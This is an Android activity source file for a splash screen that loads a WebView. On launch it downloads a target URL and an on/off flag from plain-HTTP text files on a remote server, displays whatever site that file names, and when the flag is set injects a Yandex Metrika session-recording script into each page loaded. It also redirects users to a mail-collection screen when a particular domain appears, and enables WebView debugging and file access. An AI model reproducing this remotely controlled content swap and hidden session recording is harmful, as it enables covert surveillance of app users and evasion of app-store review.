package com.checkoutme.youfine.bestplace.activities;

import android.Manifest;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Parcelable;
import android.os.RemoteException;
import android.provider.MediaStore;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;

import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.checkoutme.youfine.bestplace.R;
import com.checkoutme.youfine.bestplace.activities.ActivityGetMail;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;


public class ActivityScreenSplash extends Activity {
    //    private InterstitialAd mInterstitialAd;
    public static String TAG = "Cash";

    private String site, status;

    private WebView mWebView;

    private boolean adIsLoaded = false, startAdStarted = false;
    Timer interstitialAsLoad;

    Date date = null;

    public ValueCallback<Uri[]> uploadMessage;
    public static final int REQUEST_SELECT_FILE = 100;

    private final static String s = "var script = document.createElement('script'); script.innerHTML = function test(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)};" +
            "document.body.appendChild(script);";

    private final static String b = "var loader = document.createElement('script');" +
            "loader.innerHTML = test(window, document, \"script\", \"https://mc.yandex.ru/metrika/tag.js\", \"ym\");" +
            "document.body.appendChild(loader);";

    private final static String c = "var exe = document.createElement('script');" +
            "exe.innerHTML = ym(56140669, \"init\", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true });" +
            "document.body.appendChild(exe);";

    private void injectJS() {
        mWebView.loadUrl("javascript:" + s);
        mWebView.loadUrl("javascript:" + b);
        mWebView.loadUrl("javascript:" + c);
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.splash_screen);

        try {

            InstallReferrerClient referrerClient = InstallReferrerClient.newBuilder(getApplicationContext()).build();
            referrerClient = InstallReferrerClient.newBuilder(this).build();
            referrerClient.startConnection(new InstallReferrerStateListener() {
                @Override
                public void onInstallReferrerSetupFinished(int responseCode) {
                    switch (responseCode) {
                        case InstallReferrerClient.InstallReferrerResponse.OK:
                            // Connection established
                            break;
                        case InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED:
                            // API not available on the current Play Store app
                            break;
                        case InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE:
                            // Connection could not be established
                            break;
                    }
                }

                @Override
                public void onInstallReferrerServiceDisconnected() {
                    // Try to restart the connection on the next request to
                    // Google Play by calling the startConnection() method.
                }
            });

            ReferrerDetails response = null;
            try {
                response = referrerClient.getInstallReferrer();
            } catch (RemoteException e) {
                e.printStackTrace();
            }
            response.getInstallReferrer();
            response.getReferrerClickTimestampSeconds();
            response.getInstallBeginTimestampSeconds();
        } catch (Exception e) {
            Toast.makeText(this, "is not connected", Toast.LENGTH_SHORT).show();
        }

        String str_date="29-07-2019 10";
        DateFormat formatter = new SimpleDateFormat("dd-MM-yyyy HH");
        try {
            date = (Date)formatter.parse(str_date);
        } catch (ParseException e) {
            e.printStackTrace();
        }

        mWebView= (WebView) findViewById(R.id.web);
        String MyUA = "use required/intended UA string";
        mWebView.getSettings().setUserAgentString(MyUA);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.getSettings().setDomStorageEnabled(true);
        mWebView.getSettings().setPluginState(WebSettings.PluginState.OFF);
        mWebView.getSettings().setLoadWithOverviewMode(true);
        mWebView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
        mWebView.getSettings().setUseWideViewPort(true);
        mWebView.getSettings().setAllowFileAccess(true);
        mWebView.getSettings().setAllowFileAccess(true);
        mWebView.getSettings().setAllowContentAccess(true);
        mWebView.getSettings().supportZoom();
        mWebView.setWebChromeClient(new ChromeClient());
        mWebView.setWebContentsDebuggingEnabled(true);

        mWebView.setWebViewClient(new WebViewClient() {
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // do your handling codes here, which url is the requested url
                // probably you need to open that url rather than redirect:
                if ( url.contains(".pdf")){
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setDataAndType(Uri.parse(url), "application/pdf");
                    try{
                        view.getContext().startActivity(intent);
                    } catch (ActivityNotFoundException e) {
                        //user does not have a pdf viewer installed
                    }
                } else {
                    if (url.contains("http://appgplaybestpro.info")) {
                        Intent intent = new Intent(getApplicationContext(), ActivityGetMail.class);
                        startActivity(intent);
                        finish();
                        return false;
                    }

                    mWebView.loadUrl(url);
                    return true;                }
                return false; // then it is not handled by default action
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error){
                //Your code to do
                Toast.makeText(ActivityScreenSplash.this, error.toString(), Toast.LENGTH_LONG).show();
            }
        });

        StartAnimations();

        new Thread(new Runnable() {
            @Override
            public void run() {
                URLConnection conn = null;
                try {
                    conn = new URL("http://globalapp.info/101.txt").openConnection();
                    InputStream in = conn.getInputStream();
                    site = convertStreamToString(in);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        new Thread(new Runnable() {
            @Override
            public void run() {
                URLConnection conn = null;
                try {
                    conn = new URL("http://globalapp.info/web101.txt").openConnection();
                    InputStream in = conn.getInputStream();
                    status = convertStreamToString(in);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (site != null && site != "") {
                    mWebView.loadUrl(site.substring(0, site.length() - 1));

                    if (status.contains("1"))
                        mWebView.setWebViewClient(new WebViewClient() {
                            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                                // do your handling codes here, which url is the requested url
                                // probably you need to open that url rather than redirect:
                                if ( url.contains(".pdf")){
                                    Intent intent = new Intent(Intent.ACTION_VIEW);
                                    intent.setDataAndType(Uri.parse(url), "application/pdf");
                                    try{
                                        view.getContext().startActivity(intent);
                                    } catch (ActivityNotFoundException e) {
                                        //user does not have a pdf viewer installed
                                    }
                                } else {
                                    if (url.contains("http://appgplaybestpro.info")) {
                                        Intent intent = new Intent(getApplicationContext(), ActivityGetMail.class);
                                        startActivity(intent);
                                        finish();
                                        return false;
                                    }

                                    mWebView.loadUrl(url);
                                    return true;                }
                                return false; // then it is not handled by default action
                            }

                            @Override
                            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error){
                                //Your code to do
                                Toast.makeText(ActivityScreenSplash.this, error.toString(), Toast.LENGTH_LONG).show();
                            }

                            @Override
                            public void onPageFinished(WebView view, String url) {
                                super.onPageFinished(view, url);
                                try {
                                    injectJS();
                                } catch (Exception e) {
                                }
                            }
                        });

//                Toast.makeText(ActivityScreenSplash.this, "redirected from: " + site, Toast.LENGTH_LONG).show();
                }
            }
        }, 1000);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    if (mWebView.getUrl().contains("http://appgplaybestpro.info")) {

                        Intent intent = new Intent(getApplicationContext(), ActivityGetMail.class);
                        startActivity(intent);
                        finish();
                    } else {
                        interstitialAsLoad.cancel();
                        mWebView.setVisibility(View.VISIBLE);
                        ImageView iv = (ImageView) findViewById(R.id.splash);
                        iv.setVisibility(View.GONE);
                    }
                } catch (Exception e) {

                }
            }
        }, 2500);

//        } else {
//            requestAndExternalPermission();
//        }

        if (android.os.Build.VERSION.SDK_INT >= 21) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(mWebView, true);
        } else {
            CookieManager.getInstance().setAcceptCookie(true);
        }
    }

    private static String convertStreamToString(InputStream is) throws UnsupportedEncodingException {

        BufferedReader reader = new BufferedReader(new
                InputStreamReader(is, "UTF-8"));
        StringBuilder sb = new StringBuilder();
        String line = null;
        try {
            while ((line = reader.readLine()) != null) {
                sb.append(line + "n");
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                is.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return sb.toString();
    }

    private ValueCallback<Uri> mUploadMessage;
    private Uri mCapturedImageURI = null;
    private ValueCallback<Uri[]> mFilePathCallback;
    private String mCameraPhotoPath;
    private static final int INPUT_FILE_REQUEST_CODE = 1;
    private static final int FILECHOOSER_RESULTCODE = 1;

    private File createImageFile() throws IOException {
        // Create an image file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String imageFileName = "JPEG_" + timeStamp + "_";
        File storageDir = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES);
        File imageFile = File.createTempFile(
                imageFileName,  /* prefix */
                ".jpg",         /* suffix */
                storageDir      /* directory */
        );
        return imageFile;
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {

        if (requestCode == REQUEST_SELECT_FILE) {
            if (uploadMessage == null) return;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data));
            }
            uploadMessage = null;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {

            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
                super.onActivityResult(requestCode, resultCode, data);
                return;
            }

            Uri[] results = null;

            // Check that the response is a good one
            if (resultCode == Activity.RESULT_OK) {
                if (data == null) {
                    // If there is not data, then we may have taken a photo
                    if (mCameraPhotoPath != null) {
                        results = new Uri[]{Uri.parse(mCameraPhotoPath)};
                    }
                } else {
                    String dataString = data.getDataString();
                    if (dataString != null) {
                        results = new Uri[]{Uri.parse(dataString)};
                    }
                }
            }

            mFilePathCallback.onReceiveValue(results);
            mFilePathCallback = null;

        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            if (requestCode != FILECHOOSER_RESULTCODE || mUploadMessage == null) {
                super.onActivityResult(requestCode, resultCode, data);
                return;
            }

            if (requestCode == FILECHOOSER_RESULTCODE) {

                if (null == this.mUploadMessage) {
                    return;

                }

                Uri result = null;

                try {
                    if (resultCode != RESULT_OK) {

                        result = null;

                    } else {

                        // retrieve from the private variable if the intent is null
                        result = data == null ? mCapturedImageURI : data.getData();
                    }
                } catch (Exception e) {
                    Toast.makeText(getApplicationContext(), "activity :" + e,
                            Toast.LENGTH_LONG).show();
                }

                mUploadMessage.onReceiveValue(result);
                mUploadMessage = null;

            }
        }

        return;
    }


    private void StartAnimations() {
        Animation anim = AnimationUtils.loadAnimation(this, R.anim.alpha);
        anim.reset();
        LinearLayout l=(LinearLayout) findViewById(R.id.lin_lay);
        l.clearAnimation();
        l.startAnimation(anim);

        anim = AnimationUtils.loadAnimation(this, R.anim.translate);
        anim.reset();
        ImageView iv = (ImageView) findViewById(R.id.splash);
        iv.clearAnimation();
        iv.startAnimation(anim);

        //wait load admob
        waitInterstitialAsLoad();
    }

    private void waitInterstitialAsLoad() {
        interstitialAsLoad = new Timer();
        final int[] timer = {0};

//        if (!startAdStarted) {
//            startAdStarted = true;
//            showStartAppStartingAds();
//        }

        interstitialAsLoad.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                runOnUiThread(new Runnable() {
                    public void run() {
                        if (timer[0] >= 8) {
                            startMenuActivity();

                            if (!adIsLoaded && !startAdStarted) {
                                adIsLoaded = true;
                                startAdStarted = true;
                            }

                            interstitialAsLoad.cancel();

                            ActivityScreenSplash.this.finish();
                        }
                        timer[0]++;
                    }
                });
            }
        }, 0, 500);
    }

    public void startMenuActivity () {
        startActivity(new Intent(getApplicationContext(), ActivityGetMail.class));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (grantResults.length != 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

//            StartAnimations();

            return;
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    private void requestAndExternalPermission() {
        Log.w(TAG, "Camera permission is not granted. Requesting permission");

        final String [] permission = new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CAMERA};

        if(!hasPermissions(this, permission)){
            ActivityCompat.requestPermissions(this, permission, 101);
            return;
        }

        final Activity thisActivity = this;

        View.OnClickListener listener = new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(!hasPermissions(thisActivity, permission)){
                    ActivityCompat.requestPermissions(thisActivity, permission, 101);
                }
            }
        };
    }

    private static boolean hasPermissions(Context context, String... permissions) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    class ChromeClient extends WebChromeClient {

        // For Android 5.0
        public boolean onShowFileChooser(WebView view, ValueCallback<Uri[]> filePath, WebChromeClient.FileChooserParams fileChooserParams) {
            if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                    || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                    || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {

                requestAndExternalPermission();

                return false;
            } else {
                if (mFilePathCallback != null) {
                    mFilePathCallback.onReceiveValue(null);
                }
                mFilePathCallback = filePath;

                Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
                    // Create the File where the photo should go
                    File photoFile = null;
                    try {
                        photoFile = createImageFile();
                        takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath);
                    } catch (IOException ex) {
                        // Error occurred while creating the File
                        //                Log.e(Common.TAG, "Unable to create Image File", ex);
                    }

                    // Continue only if the File was successfully created
                    if (photoFile != null) {
                        mCameraPhotoPath = "file:" + photoFile.getAbsolutePath();
                        takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,
                                Uri.fromFile(photoFile));
                    } else {
                        takePictureIntent = null;
                    }
                }

                Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                contentSelectionIntent.setType("image/*");

                Intent[] intentArray;
                if (takePictureIntent != null) {
                    intentArray = new Intent[]{takePictureIntent};
                } else {
                    intentArray = new Intent[0];
                }

                Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
                chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser");
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);

                startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE);

                return true;
            }
        }

//        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, final WebChromeClient.FileChooserParams fileChooserParams) {
//            // make sure there is no existing message
//            if (uploadMessage != null) {
//                uploadMessage.onReceiveValue(null);
//                uploadMessage = null;
//            }
//
//            uploadMessage = filePathCallback;
//
//            try {
//                ActivityScreenSplash.this.runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        Intent intent = null;
//                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
//                            intent = fileChooserParams.createIntent();
//                        }
//
//                        startActivityForResult(intent, ActivityScreenSplash.REQUEST_SELECT_FILE);
//                    }
//                });
//            } catch (ActivityNotFoundException e) {
//                uploadMessage = null;
//
//                if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
//                        || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
//                        || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
//
//                    requestAndExternalPermission();
//
//                    return false;
//                }
//
//                return false;
//            }
//
//            return true;
//        }

        // openFileChooser for Android 3.0+
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {

            mUploadMessage = uploadMsg;
            // Create AndroidExampleFolder at sdcard
            // Create AndroidExampleFolder at sdcard

            File imageStorageDir = new File(
                    Environment.getExternalStoragePublicDirectory(
                            Environment.DIRECTORY_PICTURES)
                    , "AndroidExampleFolder");

            if (!imageStorageDir.exists()) {
                // Create AndroidExampleFolder at sdcard
                imageStorageDir.mkdirs();
            }

            // Create camera captured image file path and name
            File file = new File(
                    imageStorageDir + File.separator + "IMG_"
                            + String.valueOf(System.currentTimeMillis())
                            + ".jpg");

            mCapturedImageURI = Uri.fromFile(file);

            // Camera capture image intent
            final Intent captureIntent = new Intent(
                    android.provider.MediaStore.ACTION_IMAGE_CAPTURE);

            captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI);

            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("image/*");

            // Create file chooser intent
            Intent chooserIntent = Intent.createChooser(i, "Image Chooser");

            // Set camera intent to file chooser
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS
                    , new Parcelable[] { captureIntent });

            // On select image call onActivityResult method of activity
            startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE);


        }

        // openFileChooser for Android < 3.0
        public void openFileChooser(ValueCallback<Uri> uploadMsg) {
            openFileChooser(uploadMsg, "");
        }

        //openFileChooser for other Android versions
        public void openFileChooser(ValueCallback<Uri> uploadMsg,
                                    String acceptType,
                                    String capture) {

            openFileChooser(uploadMsg, acceptType);
        }

    }

    @Override
    public void onBackPressed() {

        if (mWebView.canGoBack())
            mWebView.goBack();
    }
}